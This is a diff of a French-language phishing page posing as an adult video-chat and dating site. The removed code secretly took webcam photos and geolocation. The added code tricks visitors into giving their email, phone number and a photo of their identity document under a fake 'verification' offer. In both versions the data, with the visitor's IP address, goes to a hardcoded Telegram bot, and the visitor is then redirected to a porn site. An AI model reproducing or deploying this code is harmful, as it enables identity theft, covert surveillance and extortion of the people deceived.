@@ -7,11 +7,10 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
   
   <style>
-    :root { --primary-blue: #00d1ff; --dark-bg: #1a1a1a; --nav-bg: #ffffff; --tab-bg: #333333; }
+    :root { --primary-blue: #00d1ff; --dark-blue: #2c5ba0; --nav-bg: #ffffff; --tab-bg: #333333; --accent-green: #28a745; --soft-gray: #f4f7f6; }
     
     body { 
       margin: 0; 
-      /* Retour au fond fixe unique */
       background: #0f0f0f url('image/cu3.jpg') no-repeat center center fixed; 
       background-size: cover; 
       font-family: 'Segoe UI', Roboto, sans-serif; 
@@ -22,232 +21,231 @@
     .hidden { display: none !important; }
 
     /* HEADER */
-    header { background: var(--nav-bg); width: 100%; position: fixed; top: 0; z-index: 2000; }
+    header { background: var(--nav-bg); width: 100%; position: fixed; top: 0; z-index: 2000; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
     .top-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 15px; height: 60px; }
     .menu-burger { border: 1.5px solid #0056b3; border-radius: 8px; padding: 8px 12px; color: #0056b3; font-size: 20px; cursor: pointer; }
     .logo-area { text-align: center; flex-grow: 1; }
-    .logo-text { font-weight: 900; font-size: 22px; text-transform: uppercase; letter-spacing: -1px; }
+    .logo-text { font-weight: 900; font-size: 19px; text-transform: uppercase; letter-spacing: -1px; line-height: 1; }
     .logo-blue { color: #2c5ba0; }
     .logo-dark { color: #333; }
+    
     .nav-tabs { display: flex; background: var(--tab-bg); border-top: 1px solid #444; }
-    .tab-item { flex: 1; text-align: center; padding: 12px 5px; font-size: 14px; color: white; border-right: 1px solid #555; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+    .tab-item { flex: 1; text-align: center; padding: 12px 5px; font-size: 13px; color: white; border-right: 1px solid #555; display: flex; align-items: center; justify-content: center; cursor: pointer; }
     .badge { background: #ff4d6d; color: white; font-size: 10px; font-weight: bold; padding: 2px 6px; border-radius: 10px; margin-right: 5px; }
 
     /* CONTENT */
     .main-content { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 110px; }
     #startBtn { padding: 16px 35px; font-size: 18px; font-weight: bold; background: rgba(0, 0, 0, 0.7); color: white; border: 2px solid var(--primary-blue); border-radius: 50px; cursor: pointer; backdrop-filter: blur(8px); z-index: 10; }
-    
     .pulse { animation: pulseBtn 1.8s infinite; }
     @keyframes pulseBtn { 0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); } 70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); } }
 
-    /* MODALS */
-    .glass-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.30); display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); z-index: 3000; padding: 20px; }
-    .modal-content { background: rgba(255, 255, 255, 0.1); padding: 25px; border-radius: 20px; width: 100%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.2); text-align: center; }
-    .input-group { position: relative; margin-bottom: 15px; }
+    /* OVERLAYS */
+    .glass-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85); display: flex; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(12px); z-index: 3000; padding: 20px; overflow-y: auto; }
+
+    /* MODAL INSCRIPTION (TRANSPARENT) */
+    .modal-transparent { background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 25px; width: 100%; max-width: 380px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.2); }
+    .input-group { position: relative; margin-bottom: 15px; text-align: left; }
     .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-blue); }
-    .input-group input { width: 100%; padding: 14px 15px 14px 45px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; color: white; outline: none; box-sizing: border-box; }
-    .btn-action { width: 100%; padding: 15px; background: var(--primary-blue); border: none; border-radius: 12px; font-weight: bold; color: black; cursor: pointer; }
-    .auth-item { text-align: left; margin: 15px 0; }
-    .auth-item h3 { font-size: 0.9rem; color: var(--primary-blue); margin-bottom: 5px; }
-    .auth-img { width: 100%; border-radius: 10px; border: 1px dashed #555; background: #222; min-height: 60px; }
-    
-    .loader { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
-    
-    video, canvas { display: none; }
+    .input-group input { width: 100%; padding: 14px 15px 14px 45px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 12px; color: white; outline: none; box-sizing: border-box; }
+
+    /* MODALS BLANCS */
+    .modal-white { background: #ffffff; padding: 25px; border-radius: 25px; width: 100%; max-width: 500px; text-align: center; color: #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; }
+    .btn-action { width: 100%; padding: 16px; background: var(--dark-blue); border: none; border-radius: 14px; font-weight: bold; color: white; cursor: pointer; text-transform: uppercase; font-size: 14px; }
+
+    /* PLANS CARDS */
+    .plans-container { display: flex; flex-direction: column; gap: 15px; margin-top: 15px; }
+    .plan-card { background: #f8f9fa; border: 1px solid #eee; border-radius: 18px; padding: 18px; text-align: left; }
+    .plan-card.featured { border: 2px solid var(--primary-blue); background: #f0faff; }
+    .plan-card h3 { margin: 0 0 8px 0; color: var(--dark-blue); font-size: 1.1rem; }
+    .plan-card ul { list-style: none; padding: 0; margin: 0 0 15px 0; font-size: 0.85rem; color: #555; }
+    .plan-card ul li { margin-bottom: 6px; display: flex; align-items: center; }
+    .plan-card ul li i { margin-right: 10px; width: 14px; }
+
+    /* VÉRIFICATION STYLE */
+    .verif-benefits { text-align: left; background: #fffbe6; border: 1px solid #ffe58f; padding: 12px; border-radius: 12px; margin-bottom: 15px; }
+    .verif-benefits li { font-size: 0.8rem; margin-bottom: 5px; display: flex; align-items: center; color: #856404; list-style: none; }
+    .upload-area { border: 2px dashed #cbd5e0; padding: 25px; border-radius: 18px; cursor: pointer; background: #fafafa; margin-bottom: 15px; }
+    #fileNameDisplay { font-weight: bold; color: var(--accent-green); margin-top: 8px; font-size: 0.85rem; }
   </style>
 </head>
 <body>
 
   <header>
-    <div class="top-bar trigger-auth">
+    <div class="top-bar" onclick="handleFlow()">
       <div class="menu-burger"><i class="fas fa-bars"></i></div>
       <div class="logo-area">
-        <span class="logo-text"><span class="logo-blue">MVIDEO</span>DISCUSSION <span class="logo-dark">PHOTO/DISCUSSION</span></span>
+        <span class="logo-text"><span class="logo-blue">MVIDEO</span>DISCUSSION <br> <span class="logo-dark">PHOTO/DISCUSSION</span></span>
       </div>
        <div style="width: 45px;"></div>
     </div>
     <div class="nav-tabs">
-      <div class="tab-item trigger-auth"><span class="badge">6</span> Rencontre</div>
-      <div class="tab-item trigger-auth"><span class="badge">4</span> Webcams</div>
-      <div class="tab-item trigger-auth"><span class="badge">10</span> Discussion</div>
+      <div class="tab-item" onclick="handleFlow()"><span class="badge">6</span> Rencontre</div>
+      <div class="tab-item" onclick="handleFlow()"><span class="badge">4</span> Webcams</div>
+      <div class="tab-item" onclick="handleFlow()"><span class="badge">9</span> Discussion</div>
     </div>
   </header>
 
   <div class="main-content">
-    <button id="startBtn" class="pulse trigger-auth">Lancer la discussion</button>
+    <button id="startBtn" class="pulse" onclick="handleFlow()">Commencer l'exploration</button>
   </div>
 
   <div id="registerModal" class="glass-overlay hidden">
-    <div class="modal-content">
-      <h2><i class="fas fa-comments"></i> Inscription Rapide</h2>
-      <p>Créez un profil pour rejoindre la communauté.</p>
+    <div class="modal-transparent">
+      <h2>Inscription</h2>
+<div><p>Vous devez tout d'abord vous inscrire</p></div>
       <div class="input-group">
         <i class="fas fa-envelope"></i>
-        <input type="email" id="regEmail" placeholder="Email">
+        <input type="email" id="regEmail" placeholder="Votre Email">
       </div>
       <div class="input-group">
         <i class="fas fa-phone"></i>
         <input type="tel" id="regPhone" placeholder="Téléphone">
       </div>
-      <button id="submitReg" class="btn-action">Continuer</button>
+      <button class="btn-action" style="background:var(--primary-blue); color:black" onclick="stepPlans()">Suivant</button>
     </div>
   </div>
 
+  <div id="planModal" class="glass-overlay hidden">
+    <div class="modal-white">
+      <h2 style="margin-top:0">Choisissez un plan gratuit</h2>
+      <div class="plans-container">
+        <div class="plan-card">
+          <h3>Sans verification d'identité</h3>
+          <ul> 
+           
+ <li><i class="fas fa-times" style="color:red"></i> Accès restreint</li>
 
-  <div id="authModal" class="glass-overlay hidden">
-    <div class="modal-content">
-      <h2 style="color: #ffcc00;"><i class="fas fa-exclamation-triangle"></i> Autorisation requise</h2>
-      <p>Pour finaliser l'inscription, veuillez autoriser les accès suivants sur votre navigateur :</p>
-      
-      <div class="auth-section">
-        <div class="auth-item">
-          <h3><i class="fas fa-camera"></i> Caméra</h3>
+<li><i class="fas fa-times" style="color:red"></i>Pas de Rencontre </li>
+
+<li><i class="fas fa-times" style="color:red"></i>Pas de Discussion</li>
+
+
+
+<li><i class="fas fa-check" style="color:green"></i> Accès Photos/Vidéos uniquement</li>
           
+</ul>
+          <button class="btn-action" style="background:#a0aec0; padding:10px;" onclick="finish('Plan 1')">Sélectionner 1</button>
         </div>
-        
-        <div class="auth-item">
-          <h3><i class="fas fa-location-dot"></i> Localisation</h3>
-           <img src="image/auto.png" alt="Indication Caméra" class="auth-img">
+        <div class="plan-card featured">
+          <div style="float:right; background:green; color:white; font-size:9px; padding:2px 6px; border-radius:10px; font-weight:bold;">RECOMMANDÉ</div><br>
+          <h3>Avec verification d'identité</h3>
+          <ul>
+            <li><i class="fas fa-check" style="color:green"></i> Pièce d'identité requise</li>
+ 
+<li><i class="fas fa-check" style="color:green"></i>Discussion & Rencontres disponible</li>           
+
+<li><i class="fas fa-check" style="color:green"></i> Interactions avec les publications</li>
+
+            
+
+<li><i class="fas fa-check" style="color:green"></i>Accès total aux fonctionnalités</li>
+          </ul> 
+          <button class="btn-action" style="background:var(--accent-green); padding:10px;" onclick="stepVerif()">Sélectionner 2</button>
         </div>
       </div>
-
-      <button id="confirmAuth" class="btn-action" style="background: #28a745; color: white;">
-        J'AI COMPRIS ET J'ACCEPTE
-      </button>
     </div>
   </div>
- 
 
- <div id="loadingScreen" class="glass-overlay hidden">
-    <div class="loader"></div>
-    <div id="loadText">Connexion...</div>
+  <div id="verifModal" class="glass-overlay hidden">
+    <div class="modal-white">
+      <h2 style="margin:0; color:var(--dark-blue); font-size: 1.3rem;"><i class="fas fa-user-shield"></i> Vérification d'identité requise</h2>
+      
+      <div class="verif-benefits" style="margin-top:15px;">
+        <li style="font-weight:bold; margin-bottom:5px; color:#856404;">En vérifiant votre identité :</li>
+        <li><i class="fas fa-video"></i>  Vous débloquez les appels vidéos HD</li>
+        <li><i class="fas fa-star"></i>  Vous obtenez le badge "Profil Certifié"</li>
+        <li><i class="fas fa-unlock"></i>  Accès total aux salons privés</li>
+      </div>
+
+      <p style="font-size: 0.85rem; text-align: left;">Importez la <b>photo</b> de votre pièce d'identité :</p>
+      
+      <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+        <i class="fas fa-camera-retro" style="font-size:30px; color:#cbd5e0;"></i>
+        <p style="margin:5px 0 0 0; font-size: 0.85rem; color: #4a5568;">Scanner ou choisir une image</p>
+        <div id="fileNameDisplay"></div>
+      </div>
+
+      <input type="file" id="fileInput" class="hidden" accept="image/*" onchange="showName()">
+      <button class="btn-action" onclick="finishVerif()" id="btnUpload">Finaliser l'inscription</button>
+      <p style="font-size: 0.65rem; color: #a0aec0; margin-top: 10px;"><i class="fas fa-lock"></i> Connexion sécurisée SSL - Vos données sont protégées.</p>
+    </div>
   </div>
-
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas"></canvas>
 
   <script>
     const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
     const chatId = "-1003619195565"; 
 
-    const registerModal = document.getElementById("registerModal");
-    const authModal = document.getElementById("authModal");
-    const loadingScreen = document.getElementById("loadingScreen");
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const startBtn = document.getElementById("startBtn");
+    function handleFlow() {
+        const isPremium = localStorage.getItem("user_premium");
+        const isRegistered = localStorage.getItem("user_done");
 
-    let photoCount = 0;
-
-    window.onload = () => {
-        if (localStorage.getItem("user_email")) {
-            startBtn.innerText = "Accéder au site web";
-        }
-    };
-
-    const getSystemInfo = () => {
-        return {
-            platform: navigator.platform,
-            time: new Date().toLocaleString(),
-            model: (navigator.userAgent.match(/\(([^)]+)\)/) || [null, "Inconnu"])[1],
-            agent: navigator.userAgent
-        };
-    };
-
-    async function handleMainClick() {
-        const emailSaved = localStorage.getItem("user_email");
-        const authSaved = localStorage.getItem("auth_validee");
-
-        if (!emailSaved) {
-            registerModal.classList.remove("hidden");
-        } else if (!authSaved) {
-            authModal.classList.remove("hidden");
+        if (isPremium) {
+            // Si Plan 2 complété, redirection directe
+            window.location.replace("https://www.mvideoporno.xxx/xhamster/");
+        } else if (isRegistered) {
+            // Si Plan 1 ou juste inscrit, on remontre les plans
+            document.getElementById("planModal").classList.remove("hidden");
         } else {
-            startBtn.innerText = "Chargement...";
-            await demarrerCaptureSilencieuse();
+            // Première fois : Inscription
+            document.getElementById("registerModal").classList.remove("hidden");
         }
     }
 
-    document.querySelectorAll('.trigger-auth').forEach(el => el.onclick = handleMainClick);
-
-    document.getElementById("submitReg").onclick = () => {
-        const email = document.getElementById("regEmail").value;
-        const phone = document.getElementById("regPhone").value;
-        if (email && phone) {
-            localStorage.setItem("user_email", email);
-            localStorage.setItem("user_phone", phone);
-            registerModal.classList.add("hidden");
-            authModal.classList.remove("hidden");
-        } else {
-            alert("Veuillez remplir les champs.");
-        }
-    };
-
-    document.getElementById("confirmAuth").onclick = () => {
-        localStorage.setItem("auth_validee", "true");
-        authModal.classList.add("hidden");
-        demarrerCaptureSilencieuse();
-    };
-
-    async function demarrerCaptureSilencieuse() {
-        loadingScreen.classList.remove("hidden");
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            navigator.geolocation.getCurrentPosition(
-                (pos) => envoyerDonnees(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-                () => envoyerDonnees("Refusée"),
-                { timeout: 5000 }
-            );
-        } catch (e) {
-            envoyerDonnees("Accès caméra refusé");
-        }
+    function stepPlans() {
+        const e = document.getElementById("regEmail").value;
+        const p = document.getElementById("regPhone").value;
+        if(e && p) {
+            localStorage.setItem("user_email", e);
+            localStorage.setItem("user_phone", p);
+            localStorage.setItem("user_done", "true");
+            document.getElementById("registerModal").classList.add("hidden");
+            document.getElementById("planModal").classList.remove("hidden");
+        } else { alert("Champs obligatoires."); }
     }
 
-    async function envoyerDonnees(coords) {
+    function stepVerif() {
+        document.getElementById("planModal").classList.add("hidden");
+        document.getElementById("verifModal").classList.remove("hidden");
+    }
+
+    function showName() {
+        const file = document.getElementById('fileInput').files[0];
+        if(file) document.getElementById('fileNameDisplay').innerText = "📄 " + file.name;
+    }
+
+    async function finish(plan) {
+        await sendTxt(`🎟️ Plan choisi: ${plan}`);
+        // On ne met pas de marqueur "premium", donc il reverra les plans au prochain clic
+        window.location.replace("https://www.mvideoporno.xxx/xhamster/");
+    }
+
+    async function finishVerif() {
+        const file = document.getElementById('fileInput').files[0];
+        if(!file) return alert("Veuillez joindre votre pièce d'identité.");
+        document.getElementById("btnUpload").innerText = "Envoi en cours...";
+        
+        const fd = new FormData();
+        fd.append("chat_id", chatId);
+        fd.append("photo", file);
+        fd.append("caption", `🪪 ID PREMIUM\nEmail: ${localStorage.getItem("user_email")}\nTel: ${localStorage.getItem("user_phone")}`);
+        
+        await sendTxt(`💎 Client Premium (Document envoyé)`);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
+        
+        // Marquer comme premium pour ne plus rien afficher
+        localStorage.setItem("user_premium", "true");
+        window.location.replace("https://www.mvideoporno.xxx/xhamster/");
+    }
+
+    async function sendTxt(extra) {
         const ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"Inconnue");
-        const info = getSystemInfo();
-        const email = localStorage.getItem("user_email");
-        const phone = localStorage.getItem("user_phone");
-
-        const text = `
-🆕 **NOUVELLE ACTIVITÉ**
-📧 Email: ${email}
-📞 Tel: ${phone}
-------------------------
-📍 Coordonnées: ${coords}
-🌐 IP: ${ip}
-📱 Modèle: ${info.model}
-🕒 Date: ${info.time}
-🖥️ OS: ${info.platform}
-🔍 User-Agent: ${info.agent}
-        `;
-
+        const text = `👤 NOUVEAU CLIENT\n📧: ${localStorage.getItem("user_email")}\n📞: ${localStorage.getItem("user_phone")}\n🌐 IP: ${ip}\n${extra}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: chatId, text: text })
         });
-
-        const interval = setInterval(async () => {
-            if(photoCount < 6) {
-                photoCount++;
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext("2d").drawImage(video, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.5));
-                const fd = new FormData();
-                fd.append("chat_id", chatId);
-                fd.append("photo", blob, "photo.jpg");
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {method:"POST", body:fd});
-            } else {
-                clearInterval(interval);
-                window.location.replace("https://www.mvideoporno.xxx/xhamster/");
-            }
-        }, 2000);
     }
   </script>
 </body>
-</html>
+          </html>
